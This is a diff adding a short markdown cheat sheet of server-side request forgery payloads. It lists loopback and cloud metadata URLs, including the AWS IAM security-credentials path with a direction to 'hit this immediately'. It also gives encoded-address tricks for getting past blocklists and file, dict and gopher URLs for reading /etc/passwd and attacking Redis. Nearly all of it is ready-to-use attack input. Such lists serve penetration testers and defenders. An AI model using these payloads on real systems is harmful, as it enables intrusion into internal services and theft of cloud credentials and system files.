@@ -1,0 +1,43 @@
+# SSRF
+
+## Basic Payloads
+
+Hit localhost and the link-local range first: internal services and cloud metadata endpoints are the most common targets.
+
+```
+http://127.0.0.1/
+http://localhost/
+http://169.254.169.254/
+http://[::1]/
+http://0.0.0.0/
+```
+
+## AWS Metadata
+
+The IMDSv1 endpoint hands out IAM credentials with no auth: if the app is on EC2 and SSRF is confirmed, hit this immediately.
+
+```
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+## Bypass Filters
+
+Blocklists keyed on "127.0.0.1" or "localhost" miss decimal, hex, and wildcard DNS representations: try alternatives when the obvious payloads are blocked.
+
+```
+http://127.1/
+http://0x7f000001/
+http://2130706433/
+http://127.0.0.1.nip.io/
+```
+
+## Protocol Smuggling
+
+Switch protocols to reach non-HTTP internal services: gopher is especially powerful for attacking Redis, memcached, and SMTP.
+
+```
+file:///etc/passwd
+dict://127.0.0.1:6379/
+gopher://127.0.0.1:6379/
+```
